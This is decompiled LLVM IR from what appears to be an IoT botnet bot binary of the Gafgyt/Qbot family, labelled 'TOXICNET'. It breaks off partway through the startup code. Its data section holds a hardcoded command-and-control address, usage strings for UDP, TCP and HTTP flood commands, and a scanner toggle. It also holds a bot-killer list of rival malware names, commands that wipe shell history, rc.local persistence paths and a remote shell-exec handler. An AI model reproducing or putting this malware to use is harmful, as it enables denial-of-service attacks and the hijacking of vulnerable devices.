@global_var_80576dd.319 = constant [5 x i8] c"i586\00"
@global_var_80576e2.320 = constant [8 x i8] c"jackmy*\00"
@global_var_80576ea.321 = constant [8 x i8] c"hackmy*\00"
@global_var_80576f2.322 = constant [5 x i8] c"arm*\00"
@global_var_80576f7.323 = constant [3 x i8] c"b1\00"
@global_var_80576fa.324 = constant [3 x i8] c"b2\00"
@global_var_80576fd.325 = constant [3 x i8] c"b3\00"
@global_var_8057700.326 = constant [3 x i8] c"b4\00"
@global_var_8057703.327 = constant [3 x i8] c"b5\00"
@global_var_8057706.328 = constant [3 x i8] c"b6\00"
@global_var_8057709.329 = constant [3 x i8] c"b7\00"
@global_var_805770c.330 = constant [3 x i8] c"b8\00"
@global_var_805770f.331 = constant [3 x i8] c"b9\00"
@global_var_8057712.332 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_8057723.333 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_805772c.334 = constant [10 x i8] c"dvrHelper\00"
@global_var_8057736.335 = constant [8 x i8] c"FDFDHFC\00"
@global_var_805773e.336 = constant [5 x i8] c"FEUB\00"
@global_var_8057743.337 = constant [9 x i8] c"FTUdftui\00"
@global_var_805774c.338 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_8057755.339 = constant [6 x i8] c"jhUOH\00"
@global_var_805775b.340 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_8057764.341 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_805776e.342 = constant [10 x i8] c"kmyx86_64\00"
@global_var_8057778.343 = constant [10 x i8] c"lolmipsel\00"
@global_var_8057782.344 = constant [8 x i8] c"RYrydry\00"
@global_var_805778a.345 = constant [5 x i8] c"tel*\00"
@global_var_805778f.346 = constant [9 x i8] c"TwoFace*\00"
@global_var_8057798.347 = constant [9 x i8] c"UYyuyioy\00"
@global_var_80577a1.348 = constant [5 x i8] c"wget\00"
@global_var_80577a6.349 = constant [7 x i8] c"x86_64\00"
@global_var_80577ad.350 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_80577b6.351 = constant [5 x i8] c"xxb*\00"
@global_var_80577be.352 = constant i32 3276849
@global_var_80577c0.353 = constant i32 3342386
@global_var_80577c2.354 = constant i32 3407923
@global_var_80577c4.355 = constant i32 3473460
@global_var_80577c6.356 = constant i32 3538997
@global_var_80577c8.357 = constant i32 3604534
@global_var_80577ca.358 = constant i32 3670071
@global_var_80577cc.359 = constant i32 3735608
@global_var_80577ce.360 = constant i32 808517689
@global_var_80577d0.361 = constant [3 x i8] c"10\00"
@global_var_80577d3.362 = constant [3 x i8] c"11\00"
@global_var_80577d6.363 = constant [3 x i8] c"12\00"
@global_var_80577d9.364 = constant [3 x i8] c"13\00"
@global_var_80577dc.365 = constant [3 x i8] c"14\00"
@global_var_80577df.366 = constant [3 x i8] c"15\00"
@global_var_80577e2.367 = constant [3 x i8] c"16\00"
@global_var_80577e5.368 = constant [3 x i8] c"17\00"
@global_var_80577e8.369 = constant [3 x i8] c"18\00"
@global_var_80577eb.370 = constant [3 x i8] c"19\00"
@global_var_80577ee.371 = constant [3 x i8] c"20\00"
@global_var_80577f1.372 = constant [6 x i8] c"hackz\00"
@global_var_80577f7.373 = constant [5 x i8] c"bin*\00"
@global_var_80577fc.374 = constant [5 x i8] c"gtop\00"
@global_var_8057801.375 = constant [5 x i8] c"ftp*\00"
@global_var_8057806.376 = constant [6 x i8] c"tftp*\00"
@global_var_805780c.377 = constant [7 x i8] c"botnet\00"
@global_var_8057813.378 = constant [8 x i8] c"swatnet\00"
@global_var_805781b.379 = constant [8 x i8] c"ballpit\00"
@global_var_8057823.380 = constant [8 x i8] c"fucknet\00"
@global_var_805782b.381 = constant [9 x i8] c"cracknet\00"
@global_var_8057834.382 = constant [8 x i8] c"weednet\00"
@global_var_805783c.383 = constant [7 x i8] c"gaynet\00"
@global_var_8057843.384 = constant [9 x i8] c"queernet\00"
@global_var_805784c.385 = constant [8 x i8] c"ballnet\00"
@global_var_8057854.386 = constant [5 x i8] c"unet\00"
@global_var_8057859.387 = constant [7 x i8] c"yougay\00"
@global_var_8057860.388 = constant [7 x i8] c"sttftp\00"
@global_var_8057867.389 = constant [7 x i8] c"sstftp\00"
@global_var_805786e.390 = constant [7 x i8] c"sbtftp\00"
@global_var_8057875.391 = constant [6 x i8] c"btftp\00"
@global_var_805787b.392 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_8057884.393 = constant [6 x i8] c"bruv*\00"
@global_var_805788a.394 = constant [5 x i8] c"IoT*\00"
@global_var_805788f.395 = constant [16 x i8] c"208.67.1.179:23\00"
@global_var_805b040.396 = global [87 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80576c0.313, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80576c5.314, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80576cc.315, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80576d0.316, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80576d4.317, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80576d9.318, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80576dd.319, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80576dd.319, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80576e2.320, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80576ea.321, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80576f2.322, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80576f7.323, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80576fa.324, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80576fd.325, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057700.326, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057703.327, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057706.328, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057709.329, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805770c.330, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805770f.331, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8057712.332, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057723.333, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805772c.334, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057736.335, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805773e.336, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057743.337, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805774c.338, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057755.339, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805775b.340, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8057764.341, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805776e.342, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8057778.343, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80576c0.313, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80576c5.314, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057782.344, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805778a.345, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805778f.346, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057798.347, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80577a1.348, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80577a6.349, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80577ad.350, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80577b6.351, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80577bb.15, i32 0, i32 0), i8* bitcast (i32* @global_var_80577be.352 to i8*), i8* bitcast (i32* @global_var_80577c0.353 to i8*), i8* bitcast (i32* @global_var_80577c2.354 to i8*), i8* bitcast (i32* @global_var_80577c4.355 to i8*), i8* bitcast (i32* @global_var_80577c6.356 to i8*), i8* bitcast (i32* @global_var_80577c8.357 to i8*), i8* bitcast (i32* @global_var_80577ca.358 to i8*), i8* bitcast (i32* @global_var_80577cc.359 to i8*), i8* bitcast (i32* @global_var_80577ce.360 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80577d0.361, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80577d3.362, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80577d6.363, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80577d9.364, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80577dc.365, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80577df.366, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80577e2.367, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80577e5.368, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80577e8.369, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80577eb.370, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80577ee.371, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80577f1.372, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80577f7.373, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80577fc.374, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057801.375, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057806.376, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805780c.377, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057813.378, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805781b.379, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057823.380, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805782b.381, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057834.382, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805783c.383, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057843.384, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805784c.385, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057854.386, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057859.387, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057860.388, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057867.389, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805786e.390, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057875.391, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805787b.392, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057884.393, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805788a.394, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805788f.395, i32 0, i32 0)]
@global_var_8058c39.397 = constant i32 1768423458
@global_var_8058c3b.398 = constant [22 x i8] c"history -c;history -w\00"
@global_var_8058c51.399 = constant [30 x i8] c"cd /root;rm -rf .bash_history\00"
@global_var_8058c6f.400 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_8058c84.401 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_8058cc4.402 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_8058d04.403 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_8058d94.404 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_8058dcc.405 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_8058dec.406 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_8058e04.407 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_8058e5c.408 = constant [7 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_8058c84.401, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_8058cc4.402, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_8058d04.403, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_8058d94.404, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_8058dcc.405, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_8058dec.406, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_8058e04.407, i32 0, i32 0)]
@global_var_8058e90.412 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_8058ed0.413 = constant [7 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_8058c84.401, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_8058cc4.402, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_8058d04.403, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_8058d94.404, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_8058dcc.405, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_8058dec.406, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_8058e04.407, i32 0, i32 0)]
@global_var_8058eec.414 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_8058f2c.415 = constant [6 x i8] c"PONG!\00"
@global_var_8058f32.416 = constant [6 x i8] c"TABLE\00"
@global_var_8058f38.417 = constant [3 x i8] c"%d\00"
@global_var_8058f3b.418 = constant [8 x i8] c"SCANNER\00"
@global_var_8058f43.419 = constant [4 x i8] c"OFF\00"
@global_var_80617b0.420 = local_unnamed_addr global i32 0
@global_var_8058f47.421 = constant [17 x i8] c"STOPPING SCANNER\00"
@global_var_8058f58.422 = constant [3 x i8] c"ON\00"
@global_var_8058f5b.423 = constant [26 x i8] c"STARTING SCANNER ON -> %s\00"
@global_var_8058f75.424 = constant [8 x i8] c"REMOVER\00"
@global_var_8058f7d.425 = constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00"
@global_var_8058f9a.426 = constant [12 x i8] c"GETPUBLICIP\00"
@global_var_8058fa6.427 = constant [17 x i8] c"My Public IP: %s\00"
@global_var_8058fb7.428 = constant [4 x i8] c"UDP\00"
@global_var_8058fbc.429 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_805902d.430 = constant [4 x i8] c"TCP\00"
@global_var_8059034.431 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_80590ee.432 = constant [5 x i8] c"HTTP\00"
@global_var_80590f3.433 = constant [10 x i8] c"HTTPFLOOD\00"
@global_var_80590fd.434 = constant [4 x i8] c"CNC\00"
@global_var_8059101.435 = constant [27 x i8] c"CNC <target> <port> <time>\00"
@global_var_805911c.436 = constant [4 x i8] c"STD\00"
@global_var_8059120.437 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_805913b.438 = constant [9 x i8] c"KILLATTK\00"
@global_var_8059144.439 = constant [11 x i8] c"Killed %d.\00"
@global_var_805914f.440 = constant [13 x i8] c"None Killed.\00"
@global_var_805915c.441 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_805b19c.442 = local_unnamed_addr global i32 -1
@global_var_805b198.443 = global [16 x i8]* @global_var_805788f.395
@global_var_8059166.444 = constant [8 x i8] c"8.8.8.8\00"
@global_var_805916e.445 = constant [16 x i8] c"/proc/net/route\00"
@global_var_805917e.446 = constant [11 x i8] c"\0900000000\09\00"
@global_var_8059189.448 = constant [9 x i8] c"TOXICNET\00"
@global_var_8059192.449 = constant i32 1952788224
@global_var_8059193.450 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_80591a6.451 = constant i32 1697579122
@global_var_80591a8.452 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_80591b7.454 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_80591bf.455 = constant i32 1868955745
@global_var_80591c1.456 = constant [13 x i8] c"fork failed\0A\00"
@global_var_80591ce.457 = constant [12 x i8] c"BUILD %s:%s\00"
@global_var_80591da.458 = constant [5 x i8] c"PONG\00"
@global_var_80591df.459 = constant [4 x i8] c"DUP\00"
@global_var_80591e3.460 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_80591f7.461 = constant [3 x i8] c"SH\00"
@global_var_80591fa.462 = constant [8 x i8] c"%s 2>&1\00"
@global_var_8059202.463 = constant [3 x i8] c"%s\00"
@global_var_8059205.464 = constant i32 32
@global_var_8061770.465 = local_unnamed_addr global i32 0
@global_var_805b278 = external local_unnamed_addr global i32
@global_var_805b2e0.468 = global i32 288
@global_var_805b330.469 = local_unnamed_addr global i32 272
@global_var_8061780.471 = global i32 0
@global_var_805b2b4.472 = global i32 0
@global_var_805f544.473 = local_unnamed_addr global i32 0
@global_var_805f548.474 = local_unnamed_addr global i32 0
@global_var_805b2cc.475 = local_unnamed_addr global i32 2
@global_var_805b29c.476 = global i32 0
@global_var_805b298.477 = global i32* @global_var_805b2e0.468
@global_var_8059820.478 = constant i32 0
@global_var_8059838.479 = constant [6 x i8] c"(nil)\00"
@global_var_805983e.480 = constant [7 x i8] c"(null)\00"
@global_var_8059845.481 = constant i32 2949163
@global_var_80598b2.483 = constant i32 327688
@global_var_80598aa.484 = constant [8 x i8] c" +0-#'I\00"
@global_var_8059858.485 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_8059895.486 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_805988b.487 = constant i32 117506048
@global_var_805987c.488 = constant i32 331776
@global_var_8059900.489 = constant [8 x i8] c"Success\00"
@global_var_80598d6.490 = constant [15 x i8] c"Unknown error \00"
@global_var_805a800.491 = constant i32 65536
@global_var_805b4e0.492 = local_unnamed_addr global i32* @global_var_805a800.491
@global_var_8061560.493 = global i32 0
@global_var_8061564.494 = global i32 0
@global_var_8061580.495 = global i32 0
@global_var_806174c.496 = global i32 0
@global_var_805b4e8.497 = global i32 0
@global_var_8061bd4.498 = local_unnamed_addr global i32 0
@global_var_8061bc8.499 = global i32 0
@global_var_80617c0.500 = global i32 0
@global_var_805b3d0.501 = global i32 0
@global_var_806186c.503 = global i32 0
@global_var_8061870.504 = local_unnamed_addr global i32 0
@global_var_8061874.505 = global i32 0
@global_var_8061880.506 = local_unnamed_addr global i32 0
@global_var_8061b74.507 = global i32 0
@global_var_8061b9c.508 = local_unnamed_addr global i32 0
@global_var_8061b8c.509 = local_unnamed_addr global i32 0
@global_var_8061b90.510 = local_unnamed_addr global i32 0
@global_var_8061b94.511 = local_unnamed_addr global i32 0
@global_var_8061b98.512 = local_unnamed_addr global i32 0
@global_var_8061ba4.513 = local_unnamed_addr global i32 0
@global_var_8061bb0.514 = local_unnamed_addr global i32 0
@global_var_8061ba8.515 = local_unnamed_addr global i32 0
@global_var_8061bb4.516 = local_unnamed_addr global i32 0
@global_var_8061b88.517 = local_unnamed_addr global i32 0
@global_var_8061b84.519 = local_unnamed_addr global i32 0
@global_var_8061bac.520 = local_unnamed_addr global i32 0
@global_var_806187c.521 = local_unnamed_addr global i32 0
@global_var_805b3e8.522 = global i32 0
@global_var_805b400.524 = global i32 0
@global_var_805b418 = external global i32
@global_var_805b444.526 = global i32 -1726662223
@global_var_805b420.527 = local_unnamed_addr global i32* @global_var_805b444.526
@global_var_805b41c.528 = global i32* @global_var_805b444.526
@global_var_805a474.529 = constant i32 0
@global_var_805a460.530 = constant i32 0
@global_var_805a488.531 = constant [3 x i8] c"-c\00"
@global_var_805a490.532 = constant [3 x i8] c"sh\00"
@global_var_805a48b.533 = constant [8 x i8] c"/bin/sh\00"
@global_var_805b4c0.534 = global i32 0
@global_var_8061764.535 = local_unnamed_addr global i32 0
@global_var_806176c.536 = local_unnamed_addr global i32 0
@global_var_805b000.538 = global i32 -1
@global_var_80547b3.539 = constant i32 -294069
@global_var_8061774.540 = local_unnamed_addr global i32 0
@global_var_8061778.541 = local_unnamed_addr global i32 0
@global_var_805a6ec.542 = constant [10 x i8] c"/dev/null\00"
@global_var_8061768.544 = local_unnamed_addr global i32 0
@global_var_8054999.546 = constant i32 1928542531
@global_var_80549bd.547 = constant i32 1928542531
@global_var_80617a4.548 = local_unnamed_addr global i32 0
@global_var_8061784.549 = global i32 0
@global_var_805aa10.551 = constant [4 x i8] c"inf\00"
@global_var_805aa13.556 = constant i32 1179535616
@global_var_805aa20.557 = constant i32 2883630
@global_var_8061bd8.561 = local_unnamed_addr global i32 0
@global_var_805aadc.562 = constant i32 1697579054
@global_var_805ab10.563 = constant i32 1868824690
@global_var_805aade.564 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_805aaef.565 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_805ab07.566 = constant [11 x i8] c"nameserver\00"
@global_var_805ab12.567 = constant [7 x i8] c"domain\00"
@global_var_805ab19.568 = constant [7 x i8] c"search\00"
@global_var_8061bb8.569 = global i32 0
@global_var_8061bdc.570 = local_unnamed_addr global i32 0
@global_var_8061be0.571 = local_unnamed_addr global i32 0
@global_var_805ab34.572 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_805ab31.574 = constant [3 x i8] c"%x\00"
@global_var_805ab45.575 = constant [11 x i8] c"/etc/hosts\00"
@global_var_805ab50.576 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_805b500.1 = local_unnamed_addr global i8 0
@global_var_805f540.13 = external local_unnamed_addr global i8*
@global_var_805b539.40 = local_unnamed_addr global i8 0
@global_var_805b53a.41 = local_unnamed_addr global i8 0
@global_var_805b530.447 = external global i8*
@1 = internal constant [2 x i8] c"/\00"
@global_var_80591b5.453 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_80598ca.482 = external constant i8*
@global_var_8061840.502 = global i8 0
@global_var_8061ba0.518 = local_unnamed_addr global i8 0
@global_var_8061760.523 = local_unnamed_addr global i8 0
@global_var_806177c.543 = local_unnamed_addr global i8 0
@global_var_8061788.558 = external global i8*
@global_var_80617a0.559 = local_unnamed_addr global i64 0
@global_var_805b4e4.560 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 77687
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_805b500.1, align 256
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048106_crit_edge

entry.dec_label_pc_8048106_crit_edge:             ; preds = %entry
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_805b024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_805b024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_805b024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_805b500.1, align 256
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %entry.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %entry.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805b024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_805b500.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_805ab64.4 to i32))
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* @global_var_805b010.6, align 16
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

